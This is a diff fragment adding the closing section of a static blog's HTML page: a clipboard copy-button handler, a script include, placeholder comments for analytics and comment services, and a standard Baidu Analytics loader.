+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
